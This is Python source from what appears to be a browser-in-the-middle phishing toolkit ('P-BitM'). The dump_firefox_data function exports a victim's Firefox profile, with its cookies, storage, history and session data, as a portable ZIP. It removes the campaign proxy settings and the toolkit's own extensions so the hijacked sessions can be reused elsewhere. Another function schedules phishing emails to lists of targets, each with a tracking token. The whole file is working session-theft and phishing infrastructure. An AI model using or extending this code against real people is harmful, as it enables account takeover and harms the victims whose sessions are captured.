from collections.abc import Sequence
from datetime import datetime, timedelta, timezone
from functools import partial
import io
import json
import logging
from pathlib import Path, PurePosixPath
import secrets
import shutil
from typing import BinaryIO
import uuid
import zipfile

from models.victim import VictimStatus, Victim
from utils.docker import get_container
from utils.export_files import ExportLimitError, configured_export_limit
from utils.files import convert_tar_to_zip, read_single_file_from_tar
from sqlalchemy.orm import Session

APP_DIR = "/bitm/app"
FIREFOX_PROFILE_DIRS = {
    "selkies": "/config/.mozilla/firefox/bitm-profile",
    "vnc": "/bitm/.mozilla/firefox/bitm-profile",
}
FIREFOX_EXPORT_OMITTED_FILES = frozenset({"prefs.js", "user.js"})
FIREFOX_EXPORT_OMITTED_DIRECTORIES = ("chrome/",)
FIREFOX_POLICY_PATH = "/etc/firefox/policies/policies.json"
PBITM_DEVELOPER_EXTENSION_DIRECTORY = PurePosixPath(
    "/bitm/app/bad_firefox_extensions"
)
FIREFOX_EXPORT_EXTENSION_CACHE_FILES = frozenset(
    {
        "addonStartup.json.lz4",
        "extensions.ini",
        "extensions.sqlite",
    }
)
FIREFOX_EXPORT_EXTENSION_METADATA_FILES = frozenset(
    {
        "extension-preferences.json",
        "extensions.json",
    }
)
MAX_FIREFOX_POLICY_BYTES = 1024 * 1024
MAX_FIREFOX_EXTENSION_XPI_BYTES = 12 * 1024 * 1024
MAX_FIREFOX_EXTENSION_MANIFEST_BYTES = 256 * 1024
MAX_FIREFOX_EXTENSION_METADATA_BYTES = 4 * 1024 * 1024

logger = logging.getLogger(__name__)

SELKIES_QUALITY_MAP = {
    "video_quality": {
        "low": {
            "h264_paintover_crf": 25,
        },
        "medium": {
            "h264_paintover_crf": 20,
        },
        "high": {
            "h264_paintover_crf": 15,
        }
    },
    "framerate": {
        "low": 30,
        "medium": 60,
        "high": 120
    },
    "compression_level": {
        "low": 25,    # More compressed
        "medium": 20, # Balanced
        "high": 15    # Less compressed (better quality)
    }
}

def get_selkies_env(config: dict) -> dict:
    """Convert dashboard quality presets to Selkies environment variables."""
    selkies = config.get("selkies", {})
    quality = selkies.get("video_quality", "medium")
    quality_settings = SELKIES_QUALITY_MAP["video_quality"][quality]
    framerate_value = SELKIES_QUALITY_MAP["framerate"][
        selkies.get("framerate", "medium")
    ]
    compression = SELKIES_QUALITY_MAP["compression_level"][
        selkies.get("compression_level", "medium")
    ]

    return {
        "SELKIES_ENABLE_STREAMING": (
            "true" if selkies.get("use_streaming_mode") else "false"
        ),
        "SELKIES_ENABLE_PAINTOVER": (
            "true" if selkies.get("use_paint_over_quality") else "false"
        ),
        "SELKIES_H264_CRF": str(compression),
        "SELKIES_H264_PAINTOVER_CRF": str(
            quality_settings["h264_paintover_crf"]
        ),
        "SELKIES_FRAMERATE": str(framerate_value),
    }


def _firefox_profile_path(archive_name: str) -> PurePosixPath:
    """Return an archive member path relative to the Firefox profile root."""
    _archive_root, separator, profile_path = archive_name.partition("/")
    return PurePosixPath(profile_path if separator else archive_name)


def _is_pbitm_developer_extension_path(extension_path: object) -> bool:
    """Return whether a policy install path belongs to P-BitM's extensions."""
    if not isinstance(extension_path, str) or "\\" in extension_path:
        return False

    candidate = PurePosixPath(extension_path)
    if not candidate.is_absolute() or any(
        part == ".." for part in candidate.parts
    ):
        return False
    try:
        relative_path = candidate.relative_to(PBITM_DEVELOPER_EXTENSION_DIRECTORY)
    except ValueError:
        return False
    return len(relative_path.parts) == 1 and relative_path.suffix.lower() == ".xpi"


def _pbitm_developer_extension_paths(policy: object) -> tuple[PurePosixPath, ...]:
    """Return only the developer extension XPI paths in a Firefox policy."""
    if not isinstance(policy, dict):
        return ()
    policies = policy.get("policies")
    if not isinstance(policies, dict):
        return ()
    extensions = policies.get("Extensions")
    if not isinstance(extensions, dict):
        return ()
    install_paths = extensions.get("Install")
    if install_paths is None:
        return ()
    if not isinstance(install_paths, list):
        raise ExportLimitError("Firefox extension policy has an invalid Install list")

    return tuple(
        PurePosixPath(extension_path)
        for extension_path in install_paths
        if _is_pbitm_developer_extension_path(extension_path)
    )


def _decode_firefox_json(data: bytes, *, description: str) -> object:
    try:
        return json.loads(data.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        raise ExportLimitError(f"{description} is not valid JSON") from exc


def _firefox_extension_id_from_manifest(manifest: object) -> str:
    if not isinstance(manifest, dict):
        raise ExportLimitError("Firefox extension manifest is not an object")

    gecko_settings = None
    for manifest_key in ("browser_specific_settings", "applications"):
        settings = manifest.get(manifest_key)
        if not isinstance(settings, dict):
            continue
        gecko_settings = settings.get("gecko")
        if isinstance(gecko_settings, dict):
            break

    extension_id = (
        gecko_settings.get("id")
        if isinstance(gecko_settings, dict)
        else None
    )
    if (
        not isinstance(extension_id, str)
        or not extension_id
        or len(extension_id) > 255
        or any(character in extension_id for character in ("/", "\\", "\0"))
    ):
        raise ExportLimitError("Firefox extension manifest has an invalid ID")
    return extension_id


def _pbitm_developer_extension_id_from_xpi(xpi_data: bytes) -> str:
    try:
        with zipfile.ZipFile(io.BytesIO(xpi_data)) as extension_archive:
            manifest_info = extension_archive.getinfo("manifest.json")
            if manifest_info.file_size > MAX_FIREFOX_EXTENSION_MANIFEST_BYTES:
                raise ExportLimitError("Firefox extension manifest is too large")
            manifest_data = extension_archive.read(manifest_info)
    except (KeyError, OSError, RuntimeError, zipfile.BadZipFile) as exc:
        raise ExportLimitError("Firefox extension XPI could not be read") from exc

    if len(manifest_data) > MAX_FIREFOX_EXTENSION_MANIFEST_BYTES:
        raise ExportLimitError("Firefox extension manifest is too large")
    return _firefox_extension_id_from_manifest(
        _decode_firefox_json(manifest_data, description="Firefox extension manifest")
    )


def _pbitm_developer_extension_ids(container) -> frozenset[str]:
    """Read IDs of P-BitM developer extensions from the active policy.

    Only paths below P-BitM's campaign extension directory are considered.
    Other policy-installed extensions, including future AMO extensions, are not
    touched by a profile export.
    """
    try:
        policy_stream, _stat = container.get_archive(FIREFOX_POLICY_PATH)
        policy_data = read_single_file_from_tar(
            policy_stream,
            max_file_bytes=MAX_FIREFOX_POLICY_BYTES,
        )
        extension_paths = _pbitm_developer_extension_paths(
            _decode_firefox_json(policy_data, description="Firefox policy")
        )
    except Exception as exc:
        logger.warning(
            "Could not identify P-BitM developer extensions for Firefox export: %s",
            exc,
        )
        return frozenset()

    extension_ids: set[str] = set()
    for extension_path in extension_paths:
        try:
            xpi_stream, _stat = container.get_archive(extension_path.as_posix())
            xpi_data = read_single_file_from_tar(
                xpi_stream,
                max_file_bytes=MAX_FIREFOX_EXTENSION_XPI_BYTES,
            )
            extension_ids.add(_pbitm_developer_extension_id_from_xpi(xpi_data))
        except Exception as exc:
            logger.warning(
                "Could not read P-BitM developer extension %s for Firefox export: %s",
                extension_path,
                exc,
            )
    return frozenset(extension_ids)


def _matches_pbitm_developer_extension_component(
    component: str,
    developer_extension_ids: frozenset[str],
) -> bool:
    return (
        component in developer_extension_ids
        or (
            component.endswith(".xpi")
            and component.removesuffix(".xpi") in developer_extension_ids
        )
    )


def _is_pbitm_developer_extension_member(
    profile_path: PurePosixPath,
    developer_extension_ids: frozenset[str],
) -> bool:
    """Return whether a profile payload belongs to a P-BitM extension."""
    path_parts = profile_path.parts
    if not path_parts:
        return False

    if path_parts[0] == "extensions":
        return any(
            _matches_pbitm_developer_extension_component(
                component,
                developer_extension_ids,
            )
            for component in path_parts[1:]
        )
    if path_parts[0] in {"browser-extension-data", "extension-store"}:
        return (
            len(path_parts) > 1
            and _matches_pbitm_developer_extension_component(
                path_parts[1],
                developer_extension_ids,
            )
        )
    return False


def is_portable_firefox_export_member(
    archive_name: str,
    developer_extension_ids: frozenset[str] = frozenset(),
) -> bool:
    """Return whether a profile member is portable outside the campaign runtime.

    ``user.js`` and ``prefs.js`` contain P-BitM's browser configuration,
    including the campaign-only proxy. ``chrome/`` contains its custom Firefox
    UI stylesheet. Firefox recreates its preferences locally while cookies,
    storage, history, and session data remain in the export.
    """
    profile_path = _firefox_profile_path(archive_name)
    profile_path_string = profile_path.as_posix()
    if (
        profile_path_string in FIREFOX_EXPORT_OMITTED_FILES
        or profile_path_string.startswith(FIREFOX_EXPORT_OMITTED_DIRECTORIES)
    ):
        return False
    if not developer_extension_ids:
        return True
    if (
        len(profile_path.parts) == 1
        and profile_path.name in FIREFOX_EXPORT_EXTENSION_CACHE_FILES
    ):
        return False
    return not _is_pbitm_developer_extension_member(
        profile_path,
        developer_extension_ids,
    )


def _read_firefox_extension_metadata(
    source: BinaryIO,
    *,
    filename: str,
) -> object:
    metadata = source.read(MAX_FIREFOX_EXTENSION_METADATA_BYTES + 1)
    if len(metadata) > MAX_FIREFOX_EXTENSION_METADATA_BYTES:
        raise ExportLimitError(f"Firefox {filename} is too large")
    return _decode_firefox_json(metadata, description=f"Firefox {filename}")


def _copy_portable_firefox_export_member(
    archive_name: str,
    source: BinaryIO,
    target: BinaryIO,
    *,
    developer_extension_ids: frozenset[str],
) -> None:
    """Copy one profile file, removing P-BitM extension metadata when needed."""
    profile_path = _firefox_profile_path(archive_name)
    if (
        not developer_extension_ids
        or len(profile_path.parts) != 1
        or profile_path.name not in FIREFOX_EXPORT_EXTENSION_METADATA_FILES
    ):
        shutil.copyfileobj(source, target, length=1024 * 1024)
        return

    metadata = _read_firefox_extension_metadata(
        source,
        filename=profile_path.name,
    )
    if profile_path.name == "extensions.json":
        if (
            not isinstance(metadata, dict)
            or not isinstance(metadata.get("addons"), list)
        ):
            raise ExportLimitError("Firefox extensions.json has an invalid addons list")
        metadata["addons"] = [
            addon
            for addon in metadata["addons"]
            if not (
                isinstance(addon, dict)
                and addon.get("id") in developer_extension_ids
            )
        ]
    else:
        if not isinstance(metadata, dict):
            raise ExportLimitError(
                "Firefox extension-preferences.json is not an object"
            )
        metadata = {
            extension_id: preferences
            for extension_id, preferences in metadata.items()
            if extension_id not in developer_extension_ids
        }

    target.write(
        json.dumps(metadata, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
    )


async def dump_firefox_data(
    container_name: str,
    destination: Path,
    *,
    protocol: str,
    max_bytes: int | None = None,
) -> int | None:
    """Write a bounded Firefox profile ZIP and return its compressed size."""
    container = get_container(container_name)
    try:
        firefox_profile_dir = FIREFOX_PROFILE_DIRS[protocol]
    except KeyError as exc:
        raise ValueError(f"Unsupported victim protocol: {protocol}") from exc
    exec_result = container.exec_run(
        f"test -d {firefox_profile_dir}",
        stdout=False,
        stderr=False,
    )
    if exec_result.exit_code != 0:
        raise Exception("Firefox profile directory not found")
    developer_extension_ids = _pbitm_developer_extension_ids(container)
    stream, _stat = container.get_archive(firefox_profile_dir)
    return convert_tar_to_zip(
        stream,
        destination,
        max_uncompressed_bytes=max_bytes or configured_export_limit(),
        member_filter=partial(
            is_portable_firefox_export_member,
            developer_extension_ids=developer_extension_ids,
        ),
        member_transform=partial(
            _copy_portable_firefox_export_member,
            developer_extension_ids=developer_extension_ids,
        ),
    )


def create_campaign_victims(
    db: Session,
    campaign_id: str,
    targets: Sequence,
    scheduled_date: datetime | None = None,
    scheduled_date_end: datetime | None = None,
    company: str | None = None,
) -> int:
    """Add scheduled victims to the caller-owned database transaction."""
    total_targets = len(targets)
    if total_targets == 0:
        return 0

    start_time = scheduled_date or datetime.now(timezone.utc)
    interval_seconds = 0.0
    if scheduled_date_end and total_targets > 1:
        duration_seconds = (scheduled_date_end - start_time).total_seconds()
        if duration_seconds > 0:
            # scheduled_end closes the email-delivery window; it is not the
            # campaign lifetime. The final recipient is scheduled strictly
            # before the boundary so all sends fit inside the selected window.
            interval_seconds = duration_seconds / total_targets

    for index, target in enumerate(targets):
        if interval_seconds > 0:
            offset_seconds = int(index * interval_seconds)
            scheduled_send = start_time + timedelta(seconds=offset_seconds)
        else:
            scheduled_send = start_time

        victim = Victim(
            id=str(uuid.uuid4())[:8],
            campaign_id=campaign_id,
            email=target.email,
            first_name=target.first_name,
            last_name=target.last_name,
            company=company,
            tracking_id=secrets.token_urlsafe(16),
            status=VictimStatus.pending,
            scheduled_send_at=scheduled_send,
            created_at=datetime.now(timezone.utc),
        )
        db.add(victim)

    return total_targets
